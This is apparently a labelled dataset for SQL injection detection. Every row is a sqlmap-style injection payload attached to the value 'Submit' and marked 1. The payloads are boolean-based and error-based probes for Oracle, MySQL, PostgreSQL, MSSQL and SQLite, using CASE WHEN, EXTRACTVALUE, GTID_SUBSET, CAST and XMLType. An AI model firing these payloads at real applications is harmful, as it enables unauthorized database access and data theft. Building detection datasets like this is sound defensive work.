"Submit AND (SELECT (CASE WHEN (1388=8813) THEN NULL ELSE CTXSYS.DRITHSX.SN(1,1388) END) FROM DUAL) IS NULL-- wdeE",1
"Submit AND (SELECT (CASE WHEN (8743=8743) THEN NULL ELSE CTXSYS.DRITHSX.SN(1,8743) END) FROM DUAL) IS NULL-- PjIr",1
"Submit AND (SELECT (CASE WHEN (6986=7149) THEN NULL ELSE CTXSYS.DRITHSX.SN(1,6986) END) FROM DUAL) IS NULL-- xbbN",1
"Submit') AND CASE WHEN 3075=9866 THEN 3075 ELSE JSON(CHAR(68,76,119,65)) END AND ('ndfQ'='ndfQ",1
"Submit') AND CASE WHEN 6550=6550 THEN 6550 ELSE JSON(CHAR(81,68,118,72)) END AND ('JEEK'='JEEK",1
"Submit') AND CASE WHEN 6105=4524 THEN 6105 ELSE JSON(CHAR(66,69,70,111)) END AND ('eJDD'='eJDD",1
"Submit')) AND CASE WHEN 5921=2901 THEN 5921 ELSE JSON(CHAR(105,113,109,109)) END AND (('HqTs'='HqTs",1
"Submit')) AND CASE WHEN 6550=6550 THEN 6550 ELSE JSON(CHAR(81,68,118,72)) END AND (('bZay'='bZay",1
"Submit')) AND CASE WHEN 2155=2487 THEN 2155 ELSE JSON(CHAR(119,120,83,106)) END AND (('wonY'='wonY",1
"Submit' AND CASE WHEN 5649=9796 THEN 5649 ELSE JSON(CHAR(69,77,72,73)) END AND 'UFml'='UFml",1
"Submit' AND CASE WHEN 6550=6550 THEN 6550 ELSE JSON(CHAR(81,68,118,72)) END AND 'PRWV'='PRWV",1
"Submit' AND CASE WHEN 9240=6191 THEN 9240 ELSE JSON(CHAR(67,90,115,99)) END AND 'XNce'='XNce",1
"Submit') AND CASE WHEN 3691=8563 THEN 3691 ELSE JSON(CHAR(87,114,68,117)) END AND ('nJIw' LIKE 'nJIw",1
"Submit') AND CASE WHEN 6550=6550 THEN 6550 ELSE JSON(CHAR(81,68,118,72)) END AND ('FWcy' LIKE 'FWcy",1
"Submit') AND CASE WHEN 4471=9978 THEN 4471 ELSE JSON(CHAR(85,113,99,77)) END AND ('KofA' LIKE 'KofA",1
"Submit%' AND CASE WHEN 6710=2009 THEN 6710 ELSE JSON(CHAR(76,82,78,84)) END AND 'bJJz%'='bJJz",1
"Submit%' AND CASE WHEN 6550=6550 THEN 6550 ELSE JSON(CHAR(81,68,118,72)) END AND 'cNFt%'='cNFt",1
"Submit%' AND CASE WHEN 6597=7141 THEN 6597 ELSE JSON(CHAR(75,71,65,101)) END AND 'lIcT%'='lIcT",1
"Submit' AND CASE WHEN 3861=9729 THEN 3861 ELSE JSON(CHAR(65,80,77,83)) END AND 'LDqr' LIKE 'LDqr",1
"Submit' AND CASE WHEN 6550=6550 THEN 6550 ELSE JSON(CHAR(81,68,118,72)) END AND 'ESHy' LIKE 'ESHy",1
"Submit' AND CASE WHEN 5211=1350 THEN 5211 ELSE JSON(CHAR(118,102,118,102)) END AND 'mhwT' LIKE 'mhwT",1
"Submit"") AND CASE WHEN 8904=9569 THEN 8904 ELSE JSON(CHAR(88,97,84,118)) END AND (""zJFG""=""zJFG",1
"Submit"") AND CASE WHEN 6550=6550 THEN 6550 ELSE JSON(CHAR(81,68,118,72)) END AND (""gRDC""=""gRDC",1
"Submit"") AND CASE WHEN 3984=7281 THEN 3984 ELSE JSON(CHAR(119,120,116,85)) END AND (""QcOR""=""QcOR",1
"Submit"" AND CASE WHEN 4441=3247 THEN 4441 ELSE JSON(CHAR(116,118,113,101)) END AND ""sFVm""=""sFVm",1
"Submit"" AND CASE WHEN 6550=6550 THEN 6550 ELSE JSON(CHAR(81,68,118,72)) END AND ""xhmS""=""xhmS",1
"Submit"" AND CASE WHEN 1080=7105 THEN 1080 ELSE JSON(CHAR(80,122,98,97)) END AND ""emrZ""=""emrZ",1
"Submit) AND CASE WHEN 2567=8089 THEN 2567 ELSE JSON(CHAR(98,118,89,90)) END AND (8631=8631",1
"Submit) AND CASE WHEN 6550=6550 THEN 6550 ELSE JSON(CHAR(81,68,118,72)) END AND (6511=6511",1
"Submit) AND CASE WHEN 5065=6235 THEN 5065 ELSE JSON(CHAR(82,75,111,84)) END AND (7068=7068",1
"Submit)) AND CASE WHEN 6758=6494 THEN 6758 ELSE JSON(CHAR(72,104,112,77)) END AND ((7566=7566",1
"Submit)) AND CASE WHEN 6550=6550 THEN 6550 ELSE JSON(CHAR(81,68,118,72)) END AND ((9621=9621",1
"Submit)) AND CASE WHEN 5060=3306 THEN 5060 ELSE JSON(CHAR(101,69,80,73)) END AND ((7856=7856",1
"Submit AND CASE WHEN 3223=9989 THEN 3223 ELSE JSON(CHAR(68,115,72,79)) END",1
"Submit AND CASE WHEN 6550=6550 THEN 6550 ELSE JSON(CHAR(81,68,118,72)) END",1
"Submit AND CASE WHEN 5676=3097 THEN 5676 ELSE JSON(CHAR(117,117,90,85)) END",1
"Submit AND CASE WHEN 8364=4103 THEN 8364 ELSE JSON(CHAR(77,120,97,117)) END-- EZaL",1
"Submit AND CASE WHEN 6550=6550 THEN 6550 ELSE JSON(CHAR(81,68,118,72)) END-- oXfb",1
"Submit AND CASE WHEN 6281=1909 THEN 6281 ELSE JSON(CHAR(122,67,120,121)) END-- Zhbt",1
(SELECT (CASE WHEN (8708=5093) THEN 'Submit' ELSE (SELECT 5093 UNION SELECT 6941) END)),1
(SELECT (CASE WHEN (6592=6592) THEN 'Submit' ELSE (SELECT 9192 UNION SELECT 5664) END)),1
(SELECT (CASE WHEN (7383=4321) THEN 'Submit' ELSE (SELECT 4321 UNION SELECT 3093) END)),1
(CASE WHEN (9764=9977) THEN 9764 ELSE 9764*(SELECT 9764 FROM DUAL UNION SELECT 9977 FROM DUAL) END),1
(CASE WHEN (5625=5625) THEN 5625 ELSE 5625*(SELECT 5625 FROM DUAL UNION SELECT 1579 FROM DUAL) END),1
(CASE WHEN (5594=4033) THEN 5594 ELSE 5594*(SELECT 5594 FROM DUAL UNION SELECT 4033 FROM DUAL) END),1
(CASE WHEN 3793=8355 THEN 3793 ELSE NULL END),1
(CASE WHEN 8195=8195 THEN 8195 ELSE NULL END),1
(CASE WHEN 1570=6202 THEN 1570 ELSE NULL END),1
"Submit,(SELECT (CASE WHEN (7669=8585) THEN 1 ELSE 7669*(SELECT 7669 FROM INFORMATION_SCHEMA.PLUGINS) END))",1
"Submit,(SELECT (CASE WHEN (4435=4435) THEN 1 ELSE 4435*(SELECT 4435 FROM INFORMATION_SCHEMA.PLUGINS) END))",1
"Submit,(SELECT (CASE WHEN (7708=1385) THEN 1 ELSE 7708*(SELECT 7708 FROM INFORMATION_SCHEMA.PLUGINS) END))",1
"Submit,(SELECT (CASE WHEN (5250=2693) THEN 1 ELSE 1/(SELECT 0) END))",1
"Submit,(SELECT (CASE WHEN (3452=3452) THEN 1 ELSE 1/(SELECT 0) END))",1
"Submit,(SELECT (CASE WHEN (5858=7111) THEN 1 ELSE 1/(SELECT 0) END))",1
"Submit') AND EXTRACTVALUE(5726,CONCAT(0x5c,0x71766b6271,(SELECT (ELT(5726=5726,1))),0x717a627671)) AND ('hoKB'='hoKB",1
"Submit')) AND EXTRACTVALUE(5726,CONCAT(0x5c,0x71766b6271,(SELECT (ELT(5726=5726,1))),0x717a627671)) AND (('kxQs'='kxQs",1
"Submit' AND EXTRACTVALUE(5726,CONCAT(0x5c,0x71766b6271,(SELECT (ELT(5726=5726,1))),0x717a627671)) AND 'EvwS'='EvwS",1
"Submit') AND EXTRACTVALUE(5726,CONCAT(0x5c,0x71766b6271,(SELECT (ELT(5726=5726,1))),0x717a627671)) AND ('gInF' LIKE 'gInF",1
"Submit%' AND EXTRACTVALUE(5726,CONCAT(0x5c,0x71766b6271,(SELECT (ELT(5726=5726,1))),0x717a627671)) AND 'gMnw%'='gMnw",1
"Submit' AND EXTRACTVALUE(5726,CONCAT(0x5c,0x71766b6271,(SELECT (ELT(5726=5726,1))),0x717a627671)) AND 'miBm' LIKE 'miBm",1
"Submit"") AND EXTRACTVALUE(5726,CONCAT(0x5c,0x71766b6271,(SELECT (ELT(5726=5726,1))),0x717a627671)) AND (""fSCe""=""fSCe",1
"Submit"" AND EXTRACTVALUE(5726,CONCAT(0x5c,0x71766b6271,(SELECT (ELT(5726=5726,1))),0x717a627671)) AND ""lFwi""=""lFwi",1
"Submit) AND EXTRACTVALUE(5726,CONCAT(0x5c,0x71766b6271,(SELECT (ELT(5726=5726,1))),0x717a627671)) AND (4034=4034",1
"Submit)) AND EXTRACTVALUE(5726,CONCAT(0x5c,0x71766b6271,(SELECT (ELT(5726=5726,1))),0x717a627671)) AND ((4957=4957",1
"Submit AND EXTRACTVALUE(5726,CONCAT(0x5c,0x71766b6271,(SELECT (ELT(5726=5726,1))),0x717a627671))",1
"Submit AND EXTRACTVALUE(5726,CONCAT(0x5c,0x71766b6271,(SELECT (ELT(5726=5726,1))),0x717a627671))-- Gdct",1
"Submit') AND GTID_SUBSET(CONCAT(0x71766b6271,(SELECT (ELT(4581=4581,1))),0x717a627671),4581) AND ('DiHE'='DiHE",1
"Submit')) AND GTID_SUBSET(CONCAT(0x71766b6271,(SELECT (ELT(4581=4581,1))),0x717a627671),4581) AND (('XaxN'='XaxN",1
"Submit' AND GTID_SUBSET(CONCAT(0x71766b6271,(SELECT (ELT(4581=4581,1))),0x717a627671),4581) AND 'TGZA'='TGZA",1
"Submit') AND GTID_SUBSET(CONCAT(0x71766b6271,(SELECT (ELT(4581=4581,1))),0x717a627671),4581) AND ('bmaS' LIKE 'bmaS",1
"Submit%' AND GTID_SUBSET(CONCAT(0x71766b6271,(SELECT (ELT(4581=4581,1))),0x717a627671),4581) AND 'edDm%'='edDm",1
"Submit' AND GTID_SUBSET(CONCAT(0x71766b6271,(SELECT (ELT(4581=4581,1))),0x717a627671),4581) AND 'Buxi' LIKE 'Buxi",1
"Submit"") AND GTID_SUBSET(CONCAT(0x71766b6271,(SELECT (ELT(4581=4581,1))),0x717a627671),4581) AND (""IFkG""=""IFkG",1
"Submit"" AND GTID_SUBSET(CONCAT(0x71766b6271,(SELECT (ELT(4581=4581,1))),0x717a627671),4581) AND ""TqPQ""=""TqPQ",1
"Submit) AND GTID_SUBSET(CONCAT(0x71766b6271,(SELECT (ELT(4581=4581,1))),0x717a627671),4581) AND (3832=3832",1
"Submit)) AND GTID_SUBSET(CONCAT(0x71766b6271,(SELECT (ELT(4581=4581,1))),0x717a627671),4581) AND ((8395=8395",1
"Submit AND GTID_SUBSET(CONCAT(0x71766b6271,(SELECT (ELT(4581=4581,1))),0x717a627671),4581)",1
"Submit AND GTID_SUBSET(CONCAT(0x71766b6271,(SELECT (ELT(4581=4581,1))),0x717a627671),4581)-- wEcZ",1
Submit') AND 6499=CAST((CHR(113)||CHR(118)||CHR(107)||CHR(98)||CHR(113))||(SELECT (CASE WHEN (6499=6499) THEN 1 ELSE 0 END))::text||(CHR(113)||CHR(122)||CHR(98)||CHR(118)||CHR(113)) AS NUMERIC) AND ('NBZK'='NBZK,1
Submit')) AND 6499=CAST((CHR(113)||CHR(118)||CHR(107)||CHR(98)||CHR(113))||(SELECT (CASE WHEN (6499=6499) THEN 1 ELSE 0 END))::text||(CHR(113)||CHR(122)||CHR(98)||CHR(118)||CHR(113)) AS NUMERIC) AND (('WmqF'='WmqF,1
Submit' AND 6499=CAST((CHR(113)||CHR(118)||CHR(107)||CHR(98)||CHR(113))||(SELECT (CASE WHEN (6499=6499) THEN 1 ELSE 0 END))::text||(CHR(113)||CHR(122)||CHR(98)||CHR(118)||CHR(113)) AS NUMERIC) AND 'bOuM'='bOuM,1
Submit') AND 6499=CAST((CHR(113)||CHR(118)||CHR(107)||CHR(98)||CHR(113))||(SELECT (CASE WHEN (6499=6499) THEN 1 ELSE 0 END))::text||(CHR(113)||CHR(122)||CHR(98)||CHR(118)||CHR(113)) AS NUMERIC) AND ('bTXO' LIKE 'bTXO,1
Submit%' AND 6499=CAST((CHR(113)||CHR(118)||CHR(107)||CHR(98)||CHR(113))||(SELECT (CASE WHEN (6499=6499) THEN 1 ELSE 0 END))::text||(CHR(113)||CHR(122)||CHR(98)||CHR(118)||CHR(113)) AS NUMERIC) AND 'oMvg%'='oMvg,1
Submit' AND 6499=CAST((CHR(113)||CHR(118)||CHR(107)||CHR(98)||CHR(113))||(SELECT (CASE WHEN (6499=6499) THEN 1 ELSE 0 END))::text||(CHR(113)||CHR(122)||CHR(98)||CHR(118)||CHR(113)) AS NUMERIC) AND 'YHVu' LIKE 'YHVu,1
"Submit"") AND 6499=CAST((CHR(113)||CHR(118)||CHR(107)||CHR(98)||CHR(113))||(SELECT (CASE WHEN (6499=6499) THEN 1 ELSE 0 END))::text||(CHR(113)||CHR(122)||CHR(98)||CHR(118)||CHR(113)) AS NUMERIC) AND (""ivWW""=""ivWW",1
"Submit"" AND 6499=CAST((CHR(113)||CHR(118)||CHR(107)||CHR(98)||CHR(113))||(SELECT (CASE WHEN (6499=6499) THEN 1 ELSE 0 END))::text||(CHR(113)||CHR(122)||CHR(98)||CHR(118)||CHR(113)) AS NUMERIC) AND ""nHUh""=""nHUh",1
Submit) AND 6499=CAST((CHR(113)||CHR(118)||CHR(107)||CHR(98)||CHR(113))||(SELECT (CASE WHEN (6499=6499) THEN 1 ELSE 0 END))::text||(CHR(113)||CHR(122)||CHR(98)||CHR(118)||CHR(113)) AS NUMERIC) AND (5144=5144,1
Submit)) AND 6499=CAST((CHR(113)||CHR(118)||CHR(107)||CHR(98)||CHR(113))||(SELECT (CASE WHEN (6499=6499) THEN 1 ELSE 0 END))::text||(CHR(113)||CHR(122)||CHR(98)||CHR(118)||CHR(113)) AS NUMERIC) AND ((3840=3840,1
Submit AND 6499=CAST((CHR(113)||CHR(118)||CHR(107)||CHR(98)||CHR(113))||(SELECT (CASE WHEN (6499=6499) THEN 1 ELSE 0 END))::text||(CHR(113)||CHR(122)||CHR(98)||CHR(118)||CHR(113)) AS NUMERIC),1
Submit AND 6499=CAST((CHR(113)||CHR(118)||CHR(107)||CHR(98)||CHR(113))||(SELECT (CASE WHEN (6499=6499) THEN 1 ELSE 0 END))::text||(CHR(113)||CHR(122)||CHR(98)||CHR(118)||CHR(113)) AS NUMERIC)-- tuTC,1
Submit') AND 3076 IN (SELECT (CHAR(113)+CHAR(118)+CHAR(107)+CHAR(98)+CHAR(113)+(SELECT (CASE WHEN (3076=3076) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(122)+CHAR(98)+CHAR(118)+CHAR(113))) AND ('IvGm'='IvGm,1
Submit')) AND 3076 IN (SELECT (CHAR(113)+CHAR(118)+CHAR(107)+CHAR(98)+CHAR(113)+(SELECT (CASE WHEN (3076=3076) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(122)+CHAR(98)+CHAR(118)+CHAR(113))) AND (('nmhq'='nmhq,1
Submit' AND 3076 IN (SELECT (CHAR(113)+CHAR(118)+CHAR(107)+CHAR(98)+CHAR(113)+(SELECT (CASE WHEN (3076=3076) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(122)+CHAR(98)+CHAR(118)+CHAR(113))) AND 'fQpq'='fQpq,1
Submit') AND 3076 IN (SELECT (CHAR(113)+CHAR(118)+CHAR(107)+CHAR(98)+CHAR(113)+(SELECT (CASE WHEN (3076=3076) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(122)+CHAR(98)+CHAR(118)+CHAR(113))) AND ('yjJS' LIKE 'yjJS,1
Submit%' AND 3076 IN (SELECT (CHAR(113)+CHAR(118)+CHAR(107)+CHAR(98)+CHAR(113)+(SELECT (CASE WHEN (3076=3076) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(122)+CHAR(98)+CHAR(118)+CHAR(113))) AND 'wHQT%'='wHQT,1
Submit' AND 3076 IN (SELECT (CHAR(113)+CHAR(118)+CHAR(107)+CHAR(98)+CHAR(113)+(SELECT (CASE WHEN (3076=3076) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(122)+CHAR(98)+CHAR(118)+CHAR(113))) AND 'cxzb' LIKE 'cxzb,1
"Submit"") AND 3076 IN (SELECT (CHAR(113)+CHAR(118)+CHAR(107)+CHAR(98)+CHAR(113)+(SELECT (CASE WHEN (3076=3076) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(122)+CHAR(98)+CHAR(118)+CHAR(113))) AND (""sqyK""=""sqyK",1
"Submit"" AND 3076 IN (SELECT (CHAR(113)+CHAR(118)+CHAR(107)+CHAR(98)+CHAR(113)+(SELECT (CASE WHEN (3076=3076) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(122)+CHAR(98)+CHAR(118)+CHAR(113))) AND ""abCs""=""abCs",1
Submit) AND 3076 IN (SELECT (CHAR(113)+CHAR(118)+CHAR(107)+CHAR(98)+CHAR(113)+(SELECT (CASE WHEN (3076=3076) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(122)+CHAR(98)+CHAR(118)+CHAR(113))) AND (1457=1457,1
Submit)) AND 3076 IN (SELECT (CHAR(113)+CHAR(118)+CHAR(107)+CHAR(98)+CHAR(113)+(SELECT (CASE WHEN (3076=3076) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(122)+CHAR(98)+CHAR(118)+CHAR(113))) AND ((4192=4192,1
Submit AND 3076 IN (SELECT (CHAR(113)+CHAR(118)+CHAR(107)+CHAR(98)+CHAR(113)+(SELECT (CASE WHEN (3076=3076) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(122)+CHAR(98)+CHAR(118)+CHAR(113))),1
Submit AND 3076 IN (SELECT (CHAR(113)+CHAR(118)+CHAR(107)+CHAR(98)+CHAR(113)+(SELECT (CASE WHEN (3076=3076) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(122)+CHAR(98)+CHAR(118)+CHAR(113)))-- lQOQ,1
"Submit') AND 7467=CONVERT(INT,(SELECT CHAR(113)+CHAR(118)+CHAR(107)+CHAR(98)+CHAR(113)+(SELECT (CASE WHEN (7467=7467) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(122)+CHAR(98)+CHAR(118)+CHAR(113))) AND ('ChXa'='ChXa",1
"Submit')) AND 7467=CONVERT(INT,(SELECT CHAR(113)+CHAR(118)+CHAR(107)+CHAR(98)+CHAR(113)+(SELECT (CASE WHEN (7467=7467) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(122)+CHAR(98)+CHAR(118)+CHAR(113))) AND (('mEUt'='mEUt",1
"Submit' AND 7467=CONVERT(INT,(SELECT CHAR(113)+CHAR(118)+CHAR(107)+CHAR(98)+CHAR(113)+(SELECT (CASE WHEN (7467=7467) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(122)+CHAR(98)+CHAR(118)+CHAR(113))) AND 'dpLQ'='dpLQ",1
"Submit') AND 7467=CONVERT(INT,(SELECT CHAR(113)+CHAR(118)+CHAR(107)+CHAR(98)+CHAR(113)+(SELECT (CASE WHEN (7467=7467) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(122)+CHAR(98)+CHAR(118)+CHAR(113))) AND ('cAiF' LIKE 'cAiF",1
"Submit%' AND 7467=CONVERT(INT,(SELECT CHAR(113)+CHAR(118)+CHAR(107)+CHAR(98)+CHAR(113)+(SELECT (CASE WHEN (7467=7467) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(122)+CHAR(98)+CHAR(118)+CHAR(113))) AND 'DkTf%'='DkTf",1
"Submit' AND 7467=CONVERT(INT,(SELECT CHAR(113)+CHAR(118)+CHAR(107)+CHAR(98)+CHAR(113)+(SELECT (CASE WHEN (7467=7467) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(122)+CHAR(98)+CHAR(118)+CHAR(113))) AND 'QVdg' LIKE 'QVdg",1
"Submit"") AND 7467=CONVERT(INT,(SELECT CHAR(113)+CHAR(118)+CHAR(107)+CHAR(98)+CHAR(113)+(SELECT (CASE WHEN (7467=7467) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(122)+CHAR(98)+CHAR(118)+CHAR(113))) AND (""ZBcP""=""ZBcP",1
"Submit"" AND 7467=CONVERT(INT,(SELECT CHAR(113)+CHAR(118)+CHAR(107)+CHAR(98)+CHAR(113)+(SELECT (CASE WHEN (7467=7467) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(122)+CHAR(98)+CHAR(118)+CHAR(113))) AND ""fFdQ""=""fFdQ",1
"Submit) AND 7467=CONVERT(INT,(SELECT CHAR(113)+CHAR(118)+CHAR(107)+CHAR(98)+CHAR(113)+(SELECT (CASE WHEN (7467=7467) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(122)+CHAR(98)+CHAR(118)+CHAR(113))) AND (9144=9144",1
"Submit)) AND 7467=CONVERT(INT,(SELECT CHAR(113)+CHAR(118)+CHAR(107)+CHAR(98)+CHAR(113)+(SELECT (CASE WHEN (7467=7467) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(122)+CHAR(98)+CHAR(118)+CHAR(113))) AND ((5970=5970",1
"Submit AND 7467=CONVERT(INT,(SELECT CHAR(113)+CHAR(118)+CHAR(107)+CHAR(98)+CHAR(113)+(SELECT (CASE WHEN (7467=7467) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(122)+CHAR(98)+CHAR(118)+CHAR(113)))",1
"Submit AND 7467=CONVERT(INT,(SELECT CHAR(113)+CHAR(118)+CHAR(107)+CHAR(98)+CHAR(113)+(SELECT (CASE WHEN (7467=7467) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(122)+CHAR(98)+CHAR(118)+CHAR(113)))-- mfqt",1
"Submit') AND 1363=CONCAT(CHAR(113)+CHAR(118)+CHAR(107)+CHAR(98)+CHAR(113),(SELECT (CASE WHEN (1363=1363) THEN CHAR(49) ELSE CHAR(48) END)),CHAR(113)+CHAR(122)+CHAR(98)+CHAR(118)+CHAR(113)) AND ('ocbX'='ocbX",1
"Submit')) AND 1363=CONCAT(CHAR(113)+CHAR(118)+CHAR(107)+CHAR(98)+CHAR(113),(SELECT (CASE WHEN (1363=1363) THEN CHAR(49) ELSE CHAR(48) END)),CHAR(113)+CHAR(122)+CHAR(98)+CHAR(118)+CHAR(113)) AND (('SYWQ'='SYWQ",1
"Submit' AND 1363=CONCAT(CHAR(113)+CHAR(118)+CHAR(107)+CHAR(98)+CHAR(113),(SELECT (CASE WHEN (1363=1363) THEN CHAR(49) ELSE CHAR(48) END)),CHAR(113)+CHAR(122)+CHAR(98)+CHAR(118)+CHAR(113)) AND 'tWRh'='tWRh",1
"Submit') AND 1363=CONCAT(CHAR(113)+CHAR(118)+CHAR(107)+CHAR(98)+CHAR(113),(SELECT (CASE WHEN (1363=1363) THEN CHAR(49) ELSE CHAR(48) END)),CHAR(113)+CHAR(122)+CHAR(98)+CHAR(118)+CHAR(113)) AND ('JDlS' LIKE 'JDlS",1
"Submit%' AND 1363=CONCAT(CHAR(113)+CHAR(118)+CHAR(107)+CHAR(98)+CHAR(113),(SELECT (CASE WHEN (1363=1363) THEN CHAR(49) ELSE CHAR(48) END)),CHAR(113)+CHAR(122)+CHAR(98)+CHAR(118)+CHAR(113)) AND 'FSkq%'='FSkq",1
"Submit' AND 1363=CONCAT(CHAR(113)+CHAR(118)+CHAR(107)+CHAR(98)+CHAR(113),(SELECT (CASE WHEN (1363=1363) THEN CHAR(49) ELSE CHAR(48) END)),CHAR(113)+CHAR(122)+CHAR(98)+CHAR(118)+CHAR(113)) AND 'qhos' LIKE 'qhos",1
"Submit"") AND 1363=CONCAT(CHAR(113)+CHAR(118)+CHAR(107)+CHAR(98)+CHAR(113),(SELECT (CASE WHEN (1363=1363) THEN CHAR(49) ELSE CHAR(48) END)),CHAR(113)+CHAR(122)+CHAR(98)+CHAR(118)+CHAR(113)) AND (""qpCN""=""qpCN",1
"Submit"" AND 1363=CONCAT(CHAR(113)+CHAR(118)+CHAR(107)+CHAR(98)+CHAR(113),(SELECT (CASE WHEN (1363=1363) THEN CHAR(49) ELSE CHAR(48) END)),CHAR(113)+CHAR(122)+CHAR(98)+CHAR(118)+CHAR(113)) AND ""GJbW""=""GJbW",1
"Submit) AND 1363=CONCAT(CHAR(113)+CHAR(118)+CHAR(107)+CHAR(98)+CHAR(113),(SELECT (CASE WHEN (1363=1363) THEN CHAR(49) ELSE CHAR(48) END)),CHAR(113)+CHAR(122)+CHAR(98)+CHAR(118)+CHAR(113)) AND (5175=5175",1
"Submit)) AND 1363=CONCAT(CHAR(113)+CHAR(118)+CHAR(107)+CHAR(98)+CHAR(113),(SELECT (CASE WHEN (1363=1363) THEN CHAR(49) ELSE CHAR(48) END)),CHAR(113)+CHAR(122)+CHAR(98)+CHAR(118)+CHAR(113)) AND ((2052=2052",1
"Submit AND 1363=CONCAT(CHAR(113)+CHAR(118)+CHAR(107)+CHAR(98)+CHAR(113),(SELECT (CASE WHEN (1363=1363) THEN CHAR(49) ELSE CHAR(48) END)),CHAR(113)+CHAR(122)+CHAR(98)+CHAR(118)+CHAR(113))",1
"Submit AND 1363=CONCAT(CHAR(113)+CHAR(118)+CHAR(107)+CHAR(98)+CHAR(113),(SELECT (CASE WHEN (1363=1363) THEN CHAR(49) ELSE CHAR(48) END)),CHAR(113)+CHAR(122)+CHAR(98)+CHAR(118)+CHAR(113))-- DuPC",1
Submit') AND 6104=(SELECT UPPER(XMLType(CHR(60)||CHR(58)||CHR(113)||CHR(118)||CHR(107)||CHR(98)||CHR(113)||(SELECT (CASE WHEN (6104=6104) THEN 1 ELSE 0 END) FROM DUAL)||CHR(113)||CHR(122)||CHR(98)||CHR(118)||CHR(113)||CHR(62))) FROM DUAL) AND ('jonp'='jonp,1
Submit')) AND 6104=(SELECT UPPER(XMLType(CHR(60)||CHR(58)||CHR(113)||CHR(118)||CHR(107)||CHR(98)||CHR(113)||(SELECT (CASE WHEN (6104=6104) THEN 1 ELSE 0 END) FROM DUAL)||CHR(113)||CHR(122)||CHR(98)||CHR(118)||CHR(113)||CHR(62))) FROM DUAL) AND (('zUUh'='zUUh,1
Submit' AND 6104=(SELECT UPPER(XMLType(CHR(60)||CHR(58)||CHR(113)||CHR(118)||CHR(107)||CHR(98)||CHR(113)||(SELECT (CASE WHEN (6104=6104) THEN 1 ELSE 0 END) FROM DUAL)||CHR(113)||CHR(122)||CHR(98)||CHR(118)||CHR(113)||CHR(62))) FROM DUAL) AND 'QmMw'='QmMw,1
Submit') AND 6104=(SELECT UPPER(XMLType(CHR(60)||CHR(58)||CHR(113)||CHR(118)||CHR(107)||CHR(98)||CHR(113)||(SELECT (CASE WHEN (6104=6104) THEN 1 ELSE 0 END) FROM DUAL)||CHR(113)||CHR(122)||CHR(98)||CHR(118)||CHR(113)||CHR(62))) FROM DUAL) AND ('SnWk' LIKE 'SnWk,1
Submit%' AND 6104=(SELECT UPPER(XMLType(CHR(60)||CHR(58)||CHR(113)||CHR(118)||CHR(107)||CHR(98)||CHR(113)||(SELECT (CASE WHEN (6104=6104) THEN 1 ELSE 0 END) FROM DUAL)||CHR(113)||CHR(122)||CHR(98)||CHR(118)||CHR(113)||CHR(62))) FROM DUAL) AND 'Zqhj%'='Zqhj,1
Submit' AND 6104=(SELECT UPPER(XMLType(CHR(60)||CHR(58)||CHR(113)||CHR(118)||CHR(107)||CHR(98)||CHR(113)||(SELECT (CASE WHEN (6104=6104) THEN 1 ELSE 0 END) FROM DUAL)||CHR(113)||CHR(122)||CHR(98)||CHR(118)||CHR(113)||CHR(62))) FROM DUAL) AND 'LotZ' LIKE 'LotZ,1
"Submit"") AND 6104=(SELECT UPPER(XMLType(CHR(60)||CHR(58)||CHR(113)||CHR(118)||CHR(107)||CHR(98)||CHR(113)||(SELECT (CASE WHEN (6104=6104) THEN 1 ELSE 0 END) FROM DUAL)||CHR(113)||CHR(122)||CHR(98)||CHR(118)||CHR(113)||CHR(62))) FROM DUAL) AND (""SzxB""=""SzxB",1
"Submit"" AND 6104=(SELECT UPPER(XMLType(CHR(60)||CHR(58)||CHR(113)||CHR(118)||CHR(107)||CHR(98)||CHR(113)||(SELECT (CASE WHEN (6104=6104) THEN 1 ELSE 0 END) FROM DUAL)||CHR(113)||CHR(122)||CHR(98)||CHR(118)||CHR(113)||CHR(62))) FROM DUAL) AND ""ZjkG""=""ZjkG",1
Submit) AND 6104=(SELECT UPPER(XMLType(CHR(60)||CHR(58)||CHR(113)||CHR(118)||CHR(107)||CHR(98)||CHR(113)||(SELECT (CASE WHEN (6104=6104) THEN 1 ELSE 0 END) FROM DUAL)||CHR(113)||CHR(122)||CHR(98)||CHR(118)||CHR(113)||CHR(62))) FROM DUAL) AND (5360=5360,1
Submit)) AND 6104=(SELECT UPPER(XMLType(CHR(60)||CHR(58)||CHR(113)||CHR(118)||CHR(107)||CHR(98)||CHR(113)||(SELECT (CASE WHEN (6104=6104) THEN 1 ELSE 0 END) FROM DUAL)||CHR(113)||CHR(122)||CHR(98)||CHR(118)||CHR(113)||CHR(62))) FROM DUAL) AND ((7494=7494,1
Submit AND 6104=(SELECT UPPER(XMLType(CHR(60)||CHR(58)||CHR(113)||CHR(118)||CHR(107)||CHR(98)||CHR(113)||(SELECT (CASE WHEN (6104=6104) THEN 1 ELSE 0 END) FROM DUAL)||CHR(113)||CHR(122)||CHR(98)||CHR(118)||CHR(113)||CHR(62))) FROM DUAL),1
